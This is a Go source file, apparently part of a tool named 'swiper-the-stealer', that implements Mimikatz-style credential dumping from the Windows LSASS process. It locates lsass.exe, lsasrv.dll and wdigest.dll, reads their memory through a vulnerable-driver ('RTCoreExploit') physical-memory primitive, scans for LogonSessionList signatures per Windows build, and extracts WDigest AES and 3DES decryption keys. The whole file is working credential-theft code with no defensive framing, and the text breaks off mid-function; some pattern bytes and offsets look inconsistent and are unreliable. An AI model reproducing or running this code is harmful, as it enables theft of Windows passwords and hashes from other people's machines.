package byovd

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
	"swiper-the-stealer/pkg/logger"
)

// Real Mimikatz pattern constants (from actual source code)
var (
	// Comprehensive LogonSessionList patterns for different Windows versions
	PTRN_WN6x_LogonSessionList     = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
	PTRN_WN1703_LogonSessionList   = []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74}
	PTRN_WN1803_LogonSessionList   = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
	PTRN_WN1903_LogonSessionList   = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
	PTRN_WN2004_LogonSessionList   = []byte{0x48, 0x8b, 0x0d, '?', '?', '?', '?', 0x48, 0x85, 0xc9, 0x0f, 0x84}
	PTRN_WN20H2_LogonSessionList   = []byte{0x4c, 0x8b, 0x1d, '?', '?', '?', '?', 0x4d, 0x85, 0xdb, 0x74, 0x27}
	PTRN_WN21H1_LogonSessionList   = []byte{0x4c, 0x8b, 0x1d, '?', '?', '?', '?', 0x4d, 0x85, 0xdb, 0x0f, 0x84}
	PTRN_WN21H2_LogonSessionList   = []byte{0x48, 0x8b, 0x05, '?', '?', '?', '?', 0x48, 0x85, 0xc0, 0x74, 0x05}
	PTRN_WN22H2_LogonSessionList   = []byte{0x4c, 0x8b, 0x05, '?', '?', '?', '?', 0x4d, 0x85, 0xc0, 0x74, 0x2b}
	PTRN_WN11_22H2_LogonSessionList = []byte{0x48, 0x8b, 0x15, '?', '?', '?', '?', 0x48, 0x85, 0xd2, 0x0f, 0x84}
	PTRN_WN11_23H2_LogonSessionList = []byte{0x4c, 0x8b, 0x0d, '?', '?', '?', '?', 0x4d, 0x85, 0xc9, 0x0f, 0x84}
	
	// Generic fallback patterns
	PTRN_Generic_LogonSessionList_1 = []byte{0x48, 0x8b, 0x0d, '?', '?', '?', '?', 0x48, 0x85, 0xc9, 0x74}
	PTRN_Generic_LogonSessionList_2 = []byte{0x4c, 0x8b, 0x1d, '?', '?', '?', '?', 0x4d, 0x85, 0xdb}
	PTRN_Generic_LogonSessionList_3 = []byte{0x48, 0x8b, 0x05, '?', '?', '?', '?', 0x48, 0x85, 0xc0}
	
	DefaultMimikatzPattern         = MimikatzPattern{MinBuildNumber: 0, Pattern: PTRN_WN6x_LogonSessionList, Offset0: 16, Offset1: -4}
)

// Windows build number constants (from mimikatz)
const (
	KULL_M_WIN_BUILD_VISTA     = 6000
	KULL_M_WIN_BUILD_7         = 7600
	KULL_M_WIN_BUILD_8         = 9200
	KULL_M_WIN_BUILD_BLUE      = 9600
	KULL_M_WIN_BUILD_10_1507   = 10240
	KULL_M_WIN_BUILD_10_1511   = 10586
	KULL_M_WIN_BUILD_10_1607   = 14393
	KULL_M_WIN_BUILD_10_1703   = 15063
	KULL_M_WIN_BUILD_10_1803   = 17134
	KULL_M_WIN_BUILD_10_1903   = 18362
)

// Pattern reference structure (mimicking KULL_M_PATCH_GENERIC)
type PatternReference struct {
	MinBuildNumber uint32
	Pattern        []byte
	Offset0        int32
	Offset1        int32
}

type MimikatzPattern struct {
	MinBuildNumber uint32
	Pattern        []byte
	Offset0        int32
	Offset1        int32
}

// DecryptionKeys holds the AES keys and IVs needed to decrypt credentials
type DecryptionKeys struct {
	AESKey    []byte // 16 bytes AES-128 key
	AESIV     []byte // 16 bytes IV
	DES3Key   []byte // 24 bytes 3DES key
	DES3IV    []byte // 8 bytes IV
	Available bool   // Whether valid keys were found
}

// WDigest pattern constants for key extraction
var (
	// WDigest patterns for finding g_fParameter and h3DesKey/hAesKey
	PTRN_WN6x_WDigest_fParameter   = []byte{0x74, 0x11, 0x8b, 0x0b, 0x85, 0xc9, 0x74, 0x0c}
	PTRN_WN10_WDigest_fParameter   = []byte{0x74, 0x11, 0x8b, 0x15, '?', '?', '?', '?', 0x85, 0xd2, 0x74}
	PTRN_WN6x_WDigest_AESKey       = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d}
	PTRN_WN10_WDigest_AESKey       = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d}
)

// LogonSessionList pattern references (from real mimikatz source)
var LogonSessionListReferences = []PatternReference{
	{KULL_M_WIN_BUILD_VISTA, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_7, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_8, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_BLUE, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_10_1507, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_10_1511, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_10_1607, PTRN_WN6x_LogonSessionList, 23, -4},
	{KULL_M_WIN_BUILD_10_1703, PTRN_WN1703_LogonSessionList, 23, -4},
	{KULL_M_WIN_BUILD_10_1803, PTRN_WN1803_LogonSessionList, 23, -4},
	{KULL_M_WIN_BUILD_10_1903, PTRN_WN1903_LogonSessionList, 23, -4},
	{19041, PTRN_WN2004_LogonSessionList, 3, 4},       // Windows 10 2004
	{19042, PTRN_WN20H2_LogonSessionList, 3, 4},       // Windows 10 20H2
	{19043, PTRN_WN21H1_LogonSessionList, 3, 4},       // Windows 10 21H1
	{19044, PTRN_WN21H2_LogonSessionList, 3, 4},       // Windows 10 21H2
	{19045, PTRN_WN22H2_LogonSessionList, 3, 4},       // Windows 10 22H2
	{22000, PTRN_WN11_22H2_LogonSessionList, 3, 4},    // Windows 11 21H2
	{22621, PTRN_WN11_22H2_LogonSessionList, 3, 4},    // Windows 11 22H2
	{22631, PTRN_WN11_23H2_LogonSessionList, 3, 4},    // Windows 11 23H2
	{26100, PTRN_WN11_23H2_LogonSessionList, 3, 4},    // Windows 11 24H2
}

// RTL_OSVERSIONINFOEXW structure for getting Windows version
type RTL_OSVERSIONINFOEXW struct {
	OSVersionInfoSize uint32
	MajorVersion      uint32
	MinorVersion      uint32
	BuildNumber       uint32
	PlatformId        uint32
	CSDVersion        [128]uint16
	ServicePackMajor  uint16
	ServicePackMinor  uint16
	SuiteMask         uint16
	ProductType       uint8
	Reserved          uint8
}

// PROCESSENTRY32W structure for process enumeration
type PROCESSENTRY32W struct {
	Size            uint32
	Usage           uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	Threads         uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

// MODULEENTRY32W structure for module enumeration
type MODULEENTRY32W struct {
	Size          uint32
	ModuleID      uint32
	ProcessID     uint32
	GlblcntUsage  uint32
	ProccntUsage  uint32
	ModBaseAddr   uintptr
	ModBaseSize   uint32
	HModule       uintptr
	ModuleName    [256]uint16
	ExePath       [260]uint16
}

// MODULEINFO structure for GetModuleInformation
type MODULEINFO struct {
	BaseOfDll   uintptr
	SizeOfImage uint32
	EntryPoint  uintptr
}

// Windows API functions for process/module enumeration and version detection
var (
	kernel32                     = syscall.MustLoadDLL("kernel32.dll")
	ntdll                        = syscall.MustLoadDLL("ntdll.dll")
	psapi                        = syscall.MustLoadDLL("psapi.dll")
	procCreateToolhelp32Snapshot = kernel32.MustFindProc("CreateToolhelp32Snapshot")
	procModule32FirstW           = kernel32.MustFindProc("Module32FirstW")
	procModule32NextW            = kernel32.MustFindProc("Module32NextW")
	procCloseHandle              = kernel32.MustFindProc("CloseHandle")
	procProcess32FirstW          = kernel32.MustFindProc("Process32FirstW")
	procProcess32NextW           = kernel32.MustFindProc("Process32NextW")
	procOpenProcess              = kernel32.MustFindProc("OpenProcess")
	procRtlGetVersion            = ntdll.MustFindProc("RtlGetVersion")
	procGetModuleInformation     = psapi.MustFindProc("GetModuleInformation")
	procEnumProcessModules       = psapi.MustFindProc("EnumProcessModules")
)

// Constants for snapshot creation
const (
	TH32CS_SNAPMODULE     = 0x00000008
	TH32CS_SNAPMODULE32   = 0x00000010
	TH32CS_SNAPPROCESS    = 0x00000002  // For process enumeration
	PROCESS_VM_READ       = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

// Real Mimikatz offset extractor - targets LSASRV.DLL, not LSASS.EXE
type LsassOffsetExtractor struct {
	rtcore          *RTCoreExploit
	logger          *logger.Logger
	buildNumber     uint32
	lsasrvBase      uint64 // Base address of lsasrv.dll module
	lsasrvSize      uint32 // Size of lsasrv.dll module  
	lsassPID        uint32 // LSASS process ID
	lsassHandle     syscall.Handle // LSASS process handle
}

// NewLsassOffsetExtractor creates a new offset extractor using RTCore - targets LSASRV.DLL
func NewLsassOffsetExtractor(rtcore *RTCoreExploit, logger *logger.Logger) *LsassOffsetExtractor {
	extractor := &LsassOffsetExtractor{
		rtcore:      rtcore,
		logger:      logger,
		buildNumber: 19045, // Default to Windows 10/11 recent
	}
	
	// Get actual Windows build number
	if build := getWindowsBuildNumber(); build != 0 {
		extractor.buildNumber = build
		logger.Infof("Detected Windows build: %d", build)
	}
	
	return extractor
}

// getWindowsBuildNumber gets the actual Windows build number using RtlGetVersion
func getWindowsBuildNumber() uint32 {
	var osVersionInfo RTL_OSVERSIONINFOEXW
	osVersionInfo.OSVersionInfoSize = uint32(unsafe.Sizeof(osVersionInfo))
	
	ret, _, _ := procRtlGetVersion.Call(uintptr(unsafe.Pointer(&osVersionInfo)))
	if ret != 0 { // STATUS_SUCCESS = 0
		// Fallback to common build number if RtlGetVersion fails
		return 19045 // Windows 10 22H2
	}
	
	return osVersionInfo.BuildNumber
}

// findLsasrvModule locates lsasrv.dll in the LSASS process
func (extractor *LsassOffsetExtractor) findLsasrvModule() error {
	extractor.logger.Infof("Enumerating modules in LSASS process PID %d", extractor.lsassPID)
	
	// Create snapshot of modules in LSASS process
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32),
		uintptr(extractor.lsassPID),
	)
	if snapshot == uintptr(^uint(0)) { // INVALID_HANDLE_VALUE
		return fmt.Errorf("failed to create module snapshot: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	// Initialize MODULEENTRY32W structure
	var me32 MODULEENTRY32W
	me32.Size = uint32(unsafe.Sizeof(me32))

	// Get first module
	ret, _, err := procModule32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
	if ret == 0 {
		return fmt.Errorf("failed to get first module: %v", err)
	}

	// Iterate through modules looking for lsasrv.dll
	for {
		// Convert UTF16 module name to string
		moduleName := syscall.UTF16ToString(me32.ModuleName[:])
		
		if moduleName == "lsasrv.dll" {
			extractor.lsasrvBase = uint64(me32.ModBaseAddr)
			extractor.lsasrvSize = me32.ModBaseSize
			extractor.logger.Infof("Found lsasrv.dll at virtual address 0x%X, size: 0x%X", 
				extractor.lsasrvBase, extractor.lsasrvSize)
			
			// Convert virtual address to physical address via RTCore
			physAddr, err := extractor.rtcore.GetPhysicalAddress(extractor.lsasrvBase)
			if err != nil {
				return fmt.Errorf("failed to convert virtual to physical address: %v", err)
			}
			
			extractor.lsasrvBase = physAddr
			extractor.logger.Infof("Converted to physical address: 0x%X", extractor.lsasrvBase)
			return nil
		}

		// Get next module
		ret, _, _ = procModule32NextW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
		if ret == 0 {
			break
		}
	}

	return fmt.Errorf("lsasrv.dll not found in LSASS process")
}

// getLsassPID gets the process ID of lsass.exe
func (extractor *LsassOffsetExtractor) getLsassPID() (uint32, error) {
	extractor.logger.Info("Enumerating processes to find lsass.exe...")
	
	// Create snapshot of all processes
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPPROCESS),
		0, // th32ProcessID - 0 for all processes
	)
	if snapshot == uintptr(^uint(0)) { // INVALID_HANDLE_VALUE
		return 0, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	// Initialize PROCESSENTRY32W structure
	var pe32 PROCESSENTRY32W
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get first process
	ret, _, err := procProcess32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
	if ret == 0 {
		return 0, fmt.Errorf("failed to get first process: %v", err)
	}

	// Iterate through processes looking for lsass.exe
	for {
		// Convert UTF16 process name to string
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		
		if processName == "lsass.exe" {
			extractor.logger.Infof("Found lsass.exe with PID: %d", pe32.ProcessID)
			return pe32.ProcessID, nil
		}

		// Get next process
		ret, _, _ = procProcess32NextW.Call(snapshot, uintptr(unsafe.Pointer(&pe32)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe process not found")
}

// openLsassProcess opens a handle to the LSASS process
func (extractor *LsassOffsetExtractor) openLsassProcess() error {
	extractor.logger.Infof("Opening handle to LSASS process (PID: %d)...", extractor.lsassPID)
	
	handle, _, err := procOpenProcess.Call(
		uintptr(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION),
		0, // bInheritHandle = FALSE
		uintptr(extractor.lsassPID),
	)
	
	if handle == 0 {
		return fmt.Errorf("failed to open LSASS process: %v", err)
	}
	
	extractor.lsassHandle = syscall.Handle(handle)
	extractor.logger.Infof("Successfully opened LSASS process handle: 0x%X", handle)
	return nil
}

// Close closes the LSASS process handle
func (extractor *LsassOffsetExtractor) Close() error {
	if extractor.lsassHandle != 0 {
		syscall.CloseHandle(extractor.lsassHandle)
		extractor.lsassHandle = 0
		extractor.logger.Info("LSASS process handle closed")
	}
	return nil
}

// calculateRIPRelativeAddress calculates the target address from a RIP-relative instruction
func (extractor *LsassOffsetExtractor) calculateRIPRelativeAddress(instructionAddr uint64, displacement []byte) uint64 {
	// Convert displacement bytes to signed 32-bit integer
	disp := int32(binary.LittleEndian.Uint32(displacement))
	
	// RIP-relative addressing: target = instruction_end + displacement
	// For MOV instructions with RIP-relative addressing in x64:
	// - Most common patterns are 7 bytes (MOV reg, [RIP+disp32])
	// - Some patterns can be 6 bytes for shorter encodings
	// We use 7 as it's the most common for the patterns we're searching
	instructionLength := uint64(7)
	targetAddr := instructionAddr + instructionLength + uint64(disp)
	
	extractor.logger.Debugf("RIP-relative calc: instruction=0x%X, disp=%d, target=0x%X", 
		instructionAddr, disp, targetAddr)
	
	return targetAddr
}

// SetBuildNumber sets the Windows build number for pattern selection
func (loe *LsassOffsetExtractor) SetBuildNumber(buildNumber uint32) {
	loe.buildNumber = buildNumber
	loe.logger.Infof("Windows build number set to: %d", buildNumber)
}

// GetPatternForBuild returns the appropriate pattern for the current build
func (loe *LsassOffsetExtractor) GetPatternForBuild() *PatternReference {
	var selectedPattern *PatternReference

	for i := len(LogonSessionListReferences) - 1; i >= 0; i-- {
		if loe.buildNumber >= LogonSessionListReferences[i].MinBuildNumber {
			selectedPattern = &LogonSessionListReferences[i]
			break
		}
	}

	if selectedPattern == nil {
		// Fallback to most recent pattern
		selectedPattern = &LogonSessionListReferences[len(LogonSessionListReferences)-1]
		loe.logger.Warn("No exact pattern match, using fallback pattern")
	}

	loe.logger.Infof("Selected pattern for build %d (min: %d)", loe.buildNumber, selectedPattern.MinBuildNumber)
	return selectedPattern
}

// FindWDigestDecryptionKeys extracts AES and DES keys from wdigest.dll in LSASS
func (loe *LsassOffsetExtractor) FindWDigestDecryptionKeys() (*DecryptionKeys, error) {
	loe.logger.Info("Searching for WDigest decryption keys in LSASS memory...")

	// First, get the memory range for wdigest.dll module in LSASS
	wdigestBase, wdigestSize, err := loe.getWDigestMemoryRange()
	if err != nil {
		return nil, fmt.Errorf("failed to get wdigest.dll memory range: %v", err)
	}

	loe.logger.Infof("WDigest module: Base=0x%x, Size=0x%x", wdigestBase, wdigestSize)

	// Read the wdigest module memory for pattern searching
	wdigestData, err := loe.rtcore.ReadPhysicalMemory(wdigestBase, uint32(wdigestSize))
	if err != nil {
		return nil, fmt.Errorf("failed to read wdigest.dll memory: %v", err)
	}

	keys := &DecryptionKeys{}

	// Try to find AES key patterns
	if aesKeyAddr := loe.searchPatternInBuffer(wdigestData, PTRN_WN10_WDigest_AESKey, wdigestBase); aesKeyAddr != 0 {
		loe.logger.Infof("Found AES key pattern at 0x%x", aesKeyAddr)
		
		// Extract AES key and IV (typically 32 bytes total - 16 key + 16 IV)
		keyData, err := loe.rtcore.ReadPhysicalMemory(aesKeyAddr, 32)
		if err == nil && len(keyData) >= 32 {
			keys.AESKey = keyData[:16]
			keys.AESIV = keyData[16:32]
			loe.logger.Info("Successfully extracted AES key and IV")
		}
	} else if aesKeyAddr := loe.searchPatternInBuffer(wdigestData, PTRN_WN6x_WDigest_AESKey, wdigestBase); aesKeyAddr != 0 {
		loe.logger.Infof("Found legacy AES key pattern at 0x%x", aesKeyAddr)
		
		keyData, err := loe.rtcore.ReadPhysicalMemory(aesKeyAddr, 32)
		if err == nil && len(keyData) >= 32 {
			keys.AESKey = keyData[:16]
			keys.AESIV = keyData[16:32]
			loe.logger.Info("Successfully extracted legacy AES key and IV")
		}
	}

	// Try to find 3DES key patterns (fallback for older systems)
	if des3KeyAddr := loe.searchPatternInBuffer(wdigestData, PTRN_WN6x_WDigest_fParameter, wdigestBase); des3KeyAddr != 0 {
		loe.logger.Infof("Found 3DES key pattern at 0x%x", des3KeyAddr)
		
		// Extract 3DES key and IV (typically 32 bytes - 24 key + 8 IV)
		keyData, err := loe.rtcore.ReadPhysicalMemory(des3KeyAddr, 32)
		if err == nil && len(keyData) >= 32 {
			keys.DES3Key = keyData[:24]
			keys.DES3IV = keyData[24:32]
			loe.logger.Info("Successfully extracted 3DES key and IV")
		}
	}

	// Check if we found any keys
	keys.Available = len(keys.AESKey) > 0 || len(keys.DES3Key) > 0
	
	if !keys.Available {
		return nil, fmt.Errorf("no decryption keys found in wdigest.dll")
	}

	loe.logger.Infof("Decryption keys extracted - AES: %t, 3DES: %t", len(keys.AESKey) > 0, len(keys.DES3Key) > 0)
	return keys, nil
}

// ScanForLogonSessionList uses real Mimikatz pattern scanning to find LogonSessionList
// ScanForLogonSessionList scans lsasrv.dll (not lsass.exe) for LogonSessionList patterns with RIP-relative addressing
func (loe *LsassOffsetExtractor) ScanForLogonSessionList() (uint64, error) {
	loe.logger.Info("=== PROPER MIMIKATZ ARCHITECTURE IMPLEMENTATION ===")
	loe.logger.Info("Step 1: Getting LSASS process ID...")
	
	// Step 1: Get LSASS PID
	pid, err := loe.getLsassPID()
	if err != nil {
		return 0, fmt.Errorf("failed to get LSASS PID: %v", err)
	}
	loe.lsassPID = pid
	loe.logger.Infof("LSASS PID: %d", pid)
	
	// Step 2: Open handle to LSASS process
	loe.logger.Info("Step 2: Opening handle to LSASS process...")
	err = loe.openLsassProcess()
	if err != nil {
		return 0, fmt.Errorf("failed to open LSASS process: %v", err)
	}
	defer loe.Close() // Ensure handle is closed
	
	// Step 3: Find lsasrv.dll module in LSASS process
	loe.logger.Info("Step 3: Enumerating modules to find lsasrv.dll...")
	err = loe.findLsasrvModule()
	if err != nil {
		return 0, fmt.Errorf("failed to find lsasrv.dll module: %v", err)
	}
	loe.logger.Infof("lsasrv.dll located at physical address: 0x%X, size: 0x%X", loe.lsasrvBase, loe.lsasrvSize)
	
	// Step 4: Read lsasrv.dll module memory using physical memory access
	loe.logger.Info("Step 4: Reading lsasrv.dll memory via RTCore physical access...")
	lsasrvData, err := loe.rtcore.ReadPhysicalMemory(loe.lsasrvBase, loe.lsasrvSize)
	if err != nil {
		return 0, fmt.Errorf("failed to read lsasrv.dll memory: %v", err)
	}
	loe.logger.Infof("Successfully read %d bytes of lsasrv.dll", len(lsasrvData))
	
	// Step 4: Get build-specific pattern  
	selectedPatternRef := loe.GetPatternForBuild()
	if selectedPatternRef == nil {
		return 0, fmt.Errorf("no pattern available for build %d", loe.buildNumber)
	}
	
	// Step 5: Search for pattern in lsasrv.dll
	loe.logger.Infof("Step 5: Scanning for pattern (build %d)...", loe.buildNumber)
	patternMatches := loe.searchPatternInMemory(lsasrvData, selectedPatternRef.Pattern)
	
	if len(patternMatches) == 0 {
		loe.logger.Warn("Build-specific pattern not found, trying fallback patterns...")
		return loe.scanWithFallbackPatterns(lsasrvData)
	}
	
	// Step 6: Process pattern matches with RIP-relative address calculation
	for i, match := range patternMatches {
		loe.logger.Infof("Processing pattern match %d at offset 0x%X", i+1, match)
		
		// Calculate absolute address of instruction
		instructionAddr := loe.lsasrvBase + uint64(match)
		
		// Extract displacement bytes (4 bytes at pattern offset)
		dispOffset := match + int(selectedPatternRef.Offset0)
		if dispOffset+4 > len(lsasrvData) {
			loe.logger.Warnf("Displacement offset out of bounds for match %d", i+1)
			continue
		}
		
		displacementBytes := lsasrvData[dispOffset:dispOffset+4]
		
		// Calculate RIP-relative target address
		targetAddr := loe.calculateRIPRelativeAddress(instructionAddr, displacementBytes)
		loe.logger.Infof("RIP-relative target calculated: 0x%X", targetAddr)
		
		// Validate the target address points to valid memory
		if loe.validateLogonSessionListPointer(targetAddr) {
			loe.logger.Infof("✓ VALID LogonSessionList found at: 0x%X", targetAddr)
			return targetAddr, nil
		} else {
			loe.logger.Warnf("✗ Target address 0x%X failed validation", targetAddr)
		}
	}
	
	return 0, fmt.Errorf("no valid LogonSessionList found after processing all pattern matches")
}

// searchPatternInMemory searches for a byte pattern in memory and returns all match offsets
func (loe *LsassOffsetExtractor) searchPatternInMemory(data []byte, pattern []byte) []int {
	var matches []int
	
	// Handle wildcard patterns by converting to bytes.Index approach
	if bytes.Contains(pattern, []byte{'?'}) {
		// Pattern contains wildcards, need manual matching
		for i := 0; i <= len(data)-len(pattern); i++ {
			found := true
			for j, b := range pattern {
				if b != '?' && data[i+j] != b {
					found = false
					break
				}
			}
			if found {
				matches = append(matches, i)
				loe.logger.Debugf("Pattern match found at offset 0x%X", i)
			}
		}
	} else {
		// No wildcards, can use faster bytes.Index
		start := 0
		for {
			idx := bytes.Index(data[start:], pattern)
			if idx == -1 {
				break
			}
			match := start + idx
			matches = append(matches, match)
			loe.logger.Debugf("Pattern match found at offset 0x%X", match)
			start = match + 1
		}
	}
	
	loe.logger.Infof("Found %d pattern matches", len(matches))
	return matches
}

// scanWithFallbackPatterns tries fallback patterns when build-specific pattern fails
func (loe *LsassOffsetExtractor) scanWithFallbackPatterns(lsasrvData []byte) (uint64, error) {
	allPatterns := []struct {
		Name    string
		Pattern []byte
		Offset0 int32
		Offset1 int32
	}{
		{"Windows 6.x (Vista/7/8/8.1)", PTRN_WN6x_LogonSessionList, 16, -4},
		{"Windows 10 1703", PTRN_WN1703_LogonSessionList, 23, -4},
		{"Windows 10 1803", PTRN_WN1803_LogonSessionList, 23, -4},
		{"Windows 10 1903", PTRN_WN1903_LogonSessionList, 23, -4},
		{"Windows 10 2004", PTRN_WN2004_LogonSessionList, 3, 4},
		{"Windows 10 20H2", PTRN_WN20H2_LogonSessionList, 3, 4},
		{"Windows 10 21H1", PTRN_WN21H1_LogonSessionList, 3, 4},
		{"Windows 10 21H2", PTRN_WN21H2_LogonSessionList, 3, 4},
		{"Windows 10 22H2", PTRN_WN22H2_LogonSessionList, 3, 4},
		{"Windows 11 22H2", PTRN_WN11_22H2_LogonSessionList, 3, 4},
		{"Windows 11 23H2", PTRN_WN11_23H2_LogonSessionList, 3, 4},
		{"Generic Pattern 1", PTRN_Generic_LogonSessionList_1, 3, 4},
		{"Generic Pattern 2", PTRN_Generic_LogonSessionList_2, 3, 4},
		{"Generic Pattern 3", PTRN_Generic_LogonSessionList_3, 3, 4},
	}

	for i, patternInfo := range allPatterns {
		loe.logger.Infof("[%d/%d] Trying fallback pattern: %s", i+1, len(allPatterns), patternInfo.Name)
		
		matches := loe.searchPatternInMemory(lsasrvData, patternInfo.Pattern)
		if len(matches) == 0 {
			continue
		}
		
		// Process each match for this pattern
		for _, match := range matches {
			instructionAddr := loe.lsasrvBase + uint64(match)
			dispOffset := match + int(patternInfo.Offset0)
			
			if dispOffset+4 > len(lsasrvData) {
				continue
			}
			
			displacementBytes := lsasrvData[dispOffset:dispOffset+4]
			targetAddr := loe.calculateRIPRelativeAddress(instructionAddr, displacementBytes)
			
			if loe.validateLogonSessionListPointer(targetAddr) {
				loe.logger.Infof("✓ FALLBACK SUCCESS! Pattern '%s' found LogonSessionList at: 0x%X", patternInfo.Name, targetAddr)
				return targetAddr, nil
			}
		}
	}
	
	return 0, fmt.Errorf("all fallback patterns failed")
}

// validateLogonSessionListPointer validates that the calculated address points to a valid LogonSessionList
func (loe *LsassOffsetExtractor) validateLogonSessionListPointer(addr uint64) bool {
	// Read a small amount of memory at the target address to validate it
	testData, err := loe.rtcore.ReadPhysicalMemory(addr, 16)
	if err != nil {
		loe.logger.Debugf("Address 0x%X validation failed: cannot read memory", addr)
		return false
	}
	
	// Basic validation: check if it looks like a valid pointer (not all zeros, not obviously invalid)
	allZero := true
	for _, b := range testData[:8] { // Check first 8 bytes (pointer size on x64)
		if b != 0 {
			allZero = false
			break
		}
	}
	
	if allZero {
		loe.logger.Debugf("Address 0x%X validation failed: points to NULL", addr)
		return false
	}
	
	loe.logger.Debugf("Address 0x%X validation passed", addr)
	return true
}

// ExtractMsvOffsets uses the found LogonSessionList to find MSV1_0 offsets
func (loe *LsassOffsetExtractor) ExtractMsvOffsets(logonSessionListAddr uint64) (uint64, error) {
	loe.logger.Info("Extracting REAL MSV1_0 offsets using Mimikatz methodology...")

	if logonSessionListAddr == 0 {
		return 0, fmt.Errorf("invalid LogonSessionList address")
	}

	// Step 1: Read the LogonSessionList pointer
	listAddressBytes, err := loe.rtcore.ReadPhysicalMemory(logonSessionListAddr, 8)
	if err != nil {
		return 0, fmt.Errorf("failed to read LogonSessionList pointer: %v", err)
	}
	listAddress := binary.LittleEndian.Uint64(listAddressBytes)
	loe.logger.Infof("Successfully extracted LogonSessionList offset: 0x%X", listAddress)

	if listAddress == 0 {
		return 0, fmt.Errorf("logon session list is empty")
	}

	// Step 2: Follow the Flink/Blink pointers to iterate through logon sessions
	// Step 3: For each session, read the credential data

	loe.logger.Infof("LogonSessionList points to: 0x%X", listAddress)

	return listAddress, nil
}

// getWDigestMemoryRange finds the memory range of wdigest.dll in LSASS process
func (loe *LsassOffsetExtractor) getWDigestMemoryRange() (uint64, uint64, error) {
	loe.logger.Info("Enumerating modules to find wdigest.dll...")
	
	// Create snapshot of modules in LSASS process
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32),
		uintptr(loe.lsassPID),
	)
	if snapshot == uintptr(^uint(0)) { // INVALID_HANDLE_VALUE
		return 0, 0, fmt.Errorf("failed to create module snapshot for wdigest: %v", err)
	}
	defer procCloseHandle.Call(snapshot)

	// Initialize MODULEENTRY32W structure
	var me32 MODULEENTRY32W
	me32.Size = uint32(unsafe.Sizeof(me32))

	// Get first module
	ret, _, err := procModule32FirstW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
	if ret == 0 {
		return 0, 0, fmt.Errorf("failed to get first module for wdigest: %v", err)
	}

	// Iterate through modules looking for wdigest.dll
	for {
		// Convert UTF16 module name to string
		moduleName := syscall.UTF16ToString(me32.ModuleName[:])
		
		if moduleName == "wdigest.dll" {
			wdigestBase := uint64(me32.ModBaseAddr)
			wdigestSize := uint64(me32.ModBaseSize)
			loe.logger.Infof("Found wdigest.dll at virtual address 0x%X, size: 0x%X", wdigestBase, wdigestSize)
			
			// Convert virtual address to physical address via RTCore
			physAddr, err := loe.rtcore.GetPhysicalAddress(wdigestBase)
			if err != nil {
				return 0, 0, fmt.Errorf("failed to convert wdigest virtual to physical address: %v", err)
			}
			
			loe.logger.Infof("wdigest.dll physical address: 0x%X", physAddr)
			return physAddr, wdigestSize, nil
		}

		// Get next module
		ret, _, _ = procModule32NextW.Call(snapshot, uintptr(unsafe.Pointer(&me32)))
		if ret == 0 {
			break
		}
	}

	return 0, 0, fmt.Errorf("wdigest.dll not found in LSASS process")
}

// searchPatternInBuffer searches for a pattern in a memory buffer with wildcard support
func (loe *LsassOffsetExtractor) searchPatternInBuffer(buffer []byte, pattern []byte, baseAddr uint64) uint64 {
	loe.logger.Debugf("Searching for %d-byte pattern in %d-byte buffer", len(pattern), len(buffer))
	
	// Enhanced pattern search with wildcard support
	for i := 0; i <= len(buffer)-len(pattern); i++ {
		match := true
		for j := 0; j < len(pattern); j++ {
			// '?' (0x3F) acts as a wildcard that matches any byte
			if pattern[j] != '?' && buffer[i+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			foundAddr := baseAddr + uint64(i)
			loe.logger.Debugf("Pattern match found at offset 0x%x (address 0x%x)", i, foundAddr)
			return foundAddr
		}
	}
	loe.logger.Debugf("Pattern not found in buffer")
	return 0
}

// getLsassMemoryRange gets the actual base address and size of LSASS process main executable
func (loe *LsassOffsetExtractor) getLsassMemoryRange() (uint64, uint64, error) {
	loe.logger.Info("Getting actual LSASS process memory range via PSAPI...")
	
	if loe.lsassHandle == 0 {
		return 0, 0, fmt.Errorf("LSASS process handle not available")
	}

	// Array to store module handles
	var modules [1024]uintptr
	var bytesNeeded uint32

	// Enumerate process modules
